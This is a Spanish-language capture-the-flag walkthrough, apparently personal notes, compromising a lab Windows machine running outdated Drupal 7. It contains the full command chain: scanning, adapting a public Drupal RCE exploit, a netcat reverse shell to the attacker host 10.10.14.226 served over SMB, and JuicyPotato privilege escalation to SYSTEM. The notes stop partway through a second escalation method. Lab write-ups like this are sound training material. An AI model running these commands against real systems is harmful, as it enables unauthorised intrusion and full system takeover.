
```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.61.47 -oG allPorts
```

Ahora haremos el reconocimiento mas exhaustivo sobre los puertos encontrados `80`, `135` y `49154` usando [[NMAP]]
```shell
nmap -p80,135,49154 -sCV -vvv 10.129.61.47 -oN targeted
```

Observamos que en el puerto `80` encontramos rutas y directorios que existen, también vemos que hay un *Drupal 7*, accederemos a la web a través del navegador.

Antes identificaremos las tecnologías que usa
![[Pasted image 20260923110212.png]]

Ahora ya accederemos a la web a través del navegador
![[Pasted image 20260923110533.png]]

Intentaremos crearnos una cuenta en la sección de `Create new account`
![[Pasted image 20260923110800.png]]

Y al rellenar los campos obtenemos el error que no ha podido ser enviado el mail
![[Pasted image 20260923111059.png]]

En el escaneo de [[NMAP]] encontramos que en el reconocimiento de ficheros y directorios encontramos que hay un archivo `CHANGELOG.txt` que es un documento donde se registran los últimos cambios realizados en la web.
![[Pasted image 20260923112648.png]]

Al observar la versión vemos que es una versión desactualizada de *Drupal* así que con [[SEARCHSPLOIT]] veremos si esta tiene alguna vulnerabilidad conocida
```shell
searchsploit drupal 7.X
```

Encontrando un exploit que permite realizar un *RCE*
![[Pasted image 20260923113806.png]]

Obtendremos mas información sobre el
```shell
searchsploit -x php/webapps/41564.php
```

Nos traeremos el exploit a nuestra maquina
```shell
searchsploit -m php/webapps/41564.php
```

Deberemos de actualizar en el archivo la URL de la web, el endpoint que por defecto viene en `rest_endpoint` este al navegar en la web no se encuentra así que probamos a usar solo `rest` encontrando así el endpoint
Tendremos que cambiar también el nombre del archivo y la data a tramitar
![[Pasted image 20260923120052.png]]

Ejecutamos el exploit
```shell
php drupalExploit.php
```

Se supone que el archivo ya ha sido subido y ya podemos acceder a el
![[Pasted image 20260923120415.png]]

Al acceder a el nos permite realizar ejecución de comandos
![[Pasted image 20260923121030.png]]


También se nos genera un archivo llamado `session.json` que nos permite añadir una nueva cookie de sesión en la web y poder obtener acceso como el usuario administrador a l maquina.

Ahora vamos a entablar una conexión con nuestra maquina realizando una *Reverse Shell* a nuestra maquina.
Primero deberemos de levantarnos un servidor con [[SMBSERVER]] y compartirnos un [[NETCAT]] con la maquina victima
```shell
smbserver.py smbFolder $(pwd)
```

A continuación deberemos de ponernos en escucha
```shell
rlwrap nc -nlvp 443
```

Y deberemos de ejecutar la *Reverse Shell* en la web
```shell
\\10.10.14.226\smbFolder\nc.exe -e cmd 10.10.14.226 443
```

Obteniendo así una shell en la maquina victima, en el escritorio del usuario *Dimitirs* encontraremos la primera flag del user.

Ahora escalaremos privilegios, enumeraremos los privilegios de mi usuario
```shell
whoami /priv
```

Observamos que tenemos `SeImpersonatePrivilege` usaremos la herramienta de [[JUICY-POTATO]]
Nos la compartiremos a través de un servidor *SMB* con [[SMBSERVER]]
```shell
smbserver.py smbFolder $(pwd)
```

Y ahora nos meteremos en el directorio `C:\Windows\Temp`
Y ahí nos descargaremos el ejecutable de [[JUICY-POTATO]]
```shell
copy \\10.10.14.226\smbFolder\JuicyPotato.exe 
```

También deberemos de copiarnos el [[NETCAT]]
```shell
copy \\10.10.14.226\smbFolder\nc.exe
```

Ahora deberemos de ejecutar [[JUICY-POTATO]] y ponernos en escucha en nuestra maquina atacante
```shell
JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a  "/c C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.226 443" -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

El uso de `-c` es para utilizar un *CLSID* para poder obtener una shell con *NT AUTHORITY\SYSTEM* usando un *CLSID* de la versión de Windows correspondiente de la maquina encontrada en el propio repositorio de [[JUICY-POTATO]].

Después habremos obtenido una shell de máximos privilegios y podremos obtener la flag de root.

# Segunda vía de escalada
Para saber que vías de escalada de privilegios tenemos podemos usar una herramienta que se llama [[SHERLOCK]] `https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1` el cual nos tenemos que descargar en nuestra maquina atacante.

Nos lo transferiremos a la maquina atacante con un sevidor *SMB* [[SMBSERVER]]
```shell
smbserver.py smbFolder $(pwd)
```

Nos lo copiamos en la maquina victima
```shell
copy \\10.10.14.226\smbFolder\Sherlock.ps1
```










